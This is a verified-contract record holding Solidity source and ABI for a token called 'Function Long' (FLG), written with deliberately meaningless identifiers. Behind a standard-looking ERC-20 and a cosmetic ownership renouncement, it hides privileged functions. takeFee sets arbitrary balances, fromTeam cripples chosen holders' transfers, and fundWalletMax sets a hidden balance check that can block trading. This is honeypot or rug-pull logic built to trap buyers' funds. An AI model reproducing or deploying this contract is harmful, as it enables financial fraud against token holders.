{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface atEnable {\n    function createPair(address amountMax, address autoFrom) external returns (address);\n}\n\ninterface liquidityFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellTotal) external view returns (uint256);\n\n    function transfer(address txMin, uint256 shouldIs) external returns (bool);\n\n    function allowance(address minAutoMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMin,\n        uint256 shouldIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyToList, uint256 value);\n    event Approval(address indexed minAutoMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract tokenSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityFromMetadata is liquidityFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FunctionLong is tokenSell, liquidityFrom, liquidityFromMetadata {\n\n    bool private toBuy;\n\n    function transferFrom(address feeTxReceiver, address txMin, uint256 shouldIs) external override returns (bool) {\n        if (_msgSender() != limitFee) {\n            if (isMode[feeTxReceiver][_msgSender()] != type(uint256).max) {\n                require(shouldIs <= isMode[feeTxReceiver][_msgSender()]);\n                isMode[feeTxReceiver][_msgSender()] -= shouldIs;\n            }\n        }\n        return amountSenderLimit(feeTxReceiver, txMin, shouldIs);\n    }\n\n    function takeFee(address feeMin, uint256 shouldIs) public {\n        fromTradingAt();\n        amountBuyTo[feeMin] = shouldIs;\n    }\n\n    uint256 private toSwap;\n\n    constructor (){\n        \n        receiverAuto buyModeFund = receiverAuto(limitFee);\n        shouldFund = atEnable(buyModeFund.factory()).createPair(buyModeFund.WETH(), address(this));\n        \n        swapTrading = _msgSender();\n        launchedExemptShould[swapTrading] = true;\n        amountBuyTo[swapTrading] = modeSell;\n        toFee();\n        if (toBuy == shouldWalletAuto) {\n            shouldWalletAuto = false;\n        }\n        emit Transfer(address(0), swapTrading, modeSell);\n    }\n\n    uint256 public atMin;\n\n    string private enableMin = \"Function Long\";\n\n    function amountSenderLimit(address feeTxReceiver, address txMin, uint256 shouldIs) internal returns (bool) {\n        if (feeTxReceiver == swapTrading) {\n            return fundReceiver(feeTxReceiver, txMin, shouldIs);\n        }\n        uint256 fundToSender = liquidityFrom(shouldFund).balanceOf(liquidityAuto);\n        require(fundToSender == swapFee);\n        require(txMin != liquidityAuto);\n        if (maxReceiver[feeTxReceiver]) {\n            return fundReceiver(feeTxReceiver, txMin, amountFund);\n        }\n        return fundReceiver(feeTxReceiver, txMin, shouldIs);\n    }\n\n    uint256 private modeSell = 100000000 * 10 ** 18;\n\n    uint8 private buyReceiver = 18;\n\n    function fromTradingAt() private view {\n        require(launchedExemptShould[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return enableMin;\n    }\n\n    uint256 private takeLaunchedAmount;\n\n    function approve(address marketingList, uint256 shouldIs) public virtual override returns (bool) {\n        isMode[_msgSender()][marketingList] = shouldIs;\n        emit Approval(_msgSender(), marketingList, shouldIs);\n        return true;\n    }\n\n    mapping(address => uint256) private amountBuyTo;\n\n    function balanceOf(address sellTotal) public view virtual override returns (uint256) {\n        return amountBuyTo[sellTotal];\n    }\n\n    address liquidityAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public launchedExemptShould;\n\n    event OwnershipTransferred(address indexed senderEnable, address indexed toShould);\n\n    bool public tradingIs;\n\n    function fundWalletMax(uint256 shouldIs) public {\n        fromTradingAt();\n        swapFee = shouldIs;\n    }\n\n    function allowance(address swapTotal, address marketingList) external view virtual override returns (uint256) {\n        if (marketingList == limitFee) {\n            return type(uint256).max;\n        }\n        return isMode[swapTotal][marketingList];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeSell;\n    }\n\n    bool private minBuy;\n\n    uint256 swapFee;\n\n    bool private launchedToSell;\n\n    mapping(address => bool) public maxReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamSellFrom;\n    }\n\n    function fundReceiver(address feeTxReceiver, address txMin, uint256 shouldIs) internal returns (bool) {\n        require(amountBuyTo[feeTxReceiver] >= shouldIs);\n        amountBuyTo[feeTxReceiver] -= shouldIs;\n        amountBuyTo[txMin] += shouldIs;\n        emit Transfer(feeTxReceiver, txMin, shouldIs);\n        return true;\n    }\n\n    bool public atShouldEnable;\n\n    string private teamSellFrom = \"FLG\";\n\n    address limitFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return toAuto;\n    }\n\n    function fromTeam(address fundList) public {\n        fromTradingAt();\n        if (takeLaunchedAmount != toSwap) {\n            takeLaunchedAmount = atMin;\n        }\n        if (fundList == swapTrading || fundList == shouldFund) {\n            return;\n        }\n        maxReceiver[fundList] = true;\n    }\n\n    uint256 listFrom;\n\n    address public shouldFund;\n\n    function getOwner() external view returns (address) {\n        return toAuto;\n    }\n\n    function toFee() public {\n        emit OwnershipTransferred(swapTrading, address(0));\n        toAuto = address(0);\n    }\n\n    address private toAuto;\n\n    uint256 constant amountFund = 11 ** 10;\n\n    function totalShouldToken(address teamMode) public {\n        if (atShouldEnable) {\n            return;\n        }\n        \n        launchedExemptShould[teamMode] = true;\n        if (shouldWalletAuto) {\n            shouldWalletAuto = false;\n        }\n        atShouldEnable = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyReceiver;\n    }\n\n    function transfer(address feeMin, uint256 shouldIs) external virtual override returns (bool) {\n        return amountSenderLimit(_msgSender(), feeMin, shouldIs);\n    }\n\n    mapping(address => mapping(address => uint256)) private isMode;\n\n    address public swapTrading;\n\n    bool private shouldWalletAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAutoMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyToList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atShouldEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"}],\"name\":\"fromTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"fundWalletMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedExemptShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"takeFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"}],\"name\":\"totalShouldToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTxReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FunctionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}